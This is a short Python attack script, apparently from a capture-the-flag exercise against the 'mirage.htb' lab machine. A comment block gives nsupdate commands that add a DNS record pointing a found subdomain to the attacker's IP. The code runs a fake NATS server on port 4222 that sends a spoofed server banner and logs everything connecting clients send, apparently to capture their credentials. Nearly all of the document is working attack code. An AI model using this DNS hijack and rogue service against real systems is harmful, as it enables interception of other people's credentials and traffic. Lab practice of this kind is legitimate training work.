'''
Use `nsupdate` to send DNS updates to the server
Point found subdomain to own IP

nsupdate
server 10.10.11.78
update add FOUND_SUBDOMAIN.mirage.htb 3600 A <YOUR_IP>
send
'''

import socket
import threading

HOST = '0.0.0.0'
PORT = 4222

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")

    info = (
        'INFO {"server_id":"fake-server","version":"2.9.9","proto":1,'
        '"go":"go1.20.0","host":"fake-nats","port":4222,"max_payload":1048576}\r\n'
    )
    conn.send(info.encode())

    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            print(f"[DATA] {addr} >>> {data.decode(errors='ignore')}")
    except Exception as e:
        print(f"[!] Error from {addr}: {e}")
    finally:
        conn.close()
        print(f"[-] Connection closed: {addr}")

def start_server():
    print(f"[*] Starting fake NATS server on {HOST}:{PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.start()

if __name__ == '__main__':
    start_server()